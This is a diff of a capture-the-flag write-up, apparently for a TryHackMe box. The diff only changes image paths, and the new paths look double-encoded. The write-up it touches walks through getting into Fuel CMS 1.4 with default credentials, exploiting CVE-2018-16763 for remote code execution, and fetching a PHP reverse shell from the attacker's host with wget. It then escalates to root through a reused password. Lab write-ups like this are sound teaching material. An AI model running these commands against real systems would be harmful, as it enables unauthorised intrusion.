@@ -32,27 +32,27 @@ We only got a website, let's check it out:
 
 
 
-![](CYBERSECURITY/IMAGES/Pasted%20image%2020250409164857.png)
+![](cybersecurity/images/Pasted%2520image%252020250409164857.png)
 
 We are dealing with something called `Fuel CMS` at version `1.4`, let's check `robots.txt` since the entrance is allowed:
 
 
-![](CYBERSECURITY/IMAGES/Pasted%20image%2020250409164943.png)
+![](cybersecurity/images/Pasted%2520image%252020250409164943.png)
 
 
 We got a `/fuel` directory:
 
 
 
-![](CYBERSECURITY/IMAGES/Pasted%20image%2020250409165010.png)
+![](cybersecurity/images/Pasted%2520image%252020250409165010.png)
 
 It takes us to a login page, if we take a deeper look at the main page, we can see this:
 
-![](CYBERSECURITY/IMAGES/Pasted%20image%2020250409165238.png)
+![](cybersecurity/images/Pasted%2520image%252020250409165238.png)
 
 Maybe default credentials still work, let's try:
 
-![](CYBERSECURITY/IMAGES/Pasted%20image%2020250409165313.png)
+![](cybersecurity/images/Pasted%2520image%252020250409165313.png)
 
 There we go, default credentials work, let's proceed to exploitation phase.
 
@@ -65,7 +65,7 @@ There we go, default credentials work, let's proceed to exploitation phase.
 Since we already got access to the admin panel, we can start searching for a way to get a shell, for example, since we already know we are dealing with `Fuel CMS 1.4`, we can take a look for any exploit:
 
 
-![](CYBERSECURITY/IMAGES/Pasted%20image%2020250409165623.png)
+![](cybersecurity/images/Pasted%2520image%252020250409165623.png)
 
 We got a `RCE` exploit on GitHub, this exploits CVE-2018-16763, if we search this CVE, we can find this information:
 
@@ -82,7 +82,7 @@ Let's download the exploit and test:
 GITHUB: https://github.com/noraj/fuelcms-rce
 ```
 
-![](CYBERSECURITY/IMAGES/Pasted%20image%2020250409165739.png)
+![](cybersecurity/images/Pasted%2520image%252020250409165739.png)
 
 There we go, we got `RCE`, we can download a reverse shell file and put it into the machine like this: 
 
@@ -92,7 +92,7 @@ ruby exploit.rb http://10.10.172.18/ "wget+http://10.6.34.159:8000/thm_shell.php
 
 We can see it gets downloaded:
 
-![](CYBERSECURITY/IMAGES/Pasted%20image%2020250409171154.png)
+![](cybersecurity/images/Pasted%2520image%252020250409171154.png)
 
 Now, we can simply visit:
 
@@ -102,7 +102,7 @@ http://IP/shell.php
 
 If we got our listener ready, we'll see the connection:
 
-![](CYBERSECURITY/IMAGES/Pasted%20image%2020250409171256.png)
+![](cybersecurity/images/Pasted%2520image%252020250409171256.png)
 
 
 
@@ -122,7 +122,7 @@ export TERM=xterm
 export BASH=bash
 ```
 
-![](CYBERSECURITY/IMAGES/Pasted%20image%2020250409171335.png)
+![](cybersecurity/images/Pasted%2520image%252020250409171335.png)
 
 We can read first flag:
 
@@ -134,11 +134,11 @@ www-data@ubuntu:/home/www-data$ cat flag.txt
 I used `linpeas` and found this, since there are no `4000 SUID` binaries or other stuff like that, maybe this will do to get root:
 
 
-![](CYBERSECURITY/IMAGES/Pasted%20image%2020250409172944.png)
+![](cybersecurity/images/Pasted%2520image%252020250409172944.png)
 
 We got a password, let's switch to root:
 
-![](CYBERSECURITY/IMAGES/Pasted%20image%2020250409173005.png)
+![](cybersecurity/images/Pasted%2520image%252020250409173005.png)
 
 Yeah, they reused the password for the database with the same as the bash console, let's get root flag:
 
@@ -148,6 +148,6 @@ b9bbcb33e11b80be759c4e844862482d
 ```
 
 
-![](CYBERSECURITY/IMAGES/Pasted%20image%2020250409173046.png)
+![](cybersecurity/images/Pasted%2520image%252020250409173046.png)
 
 
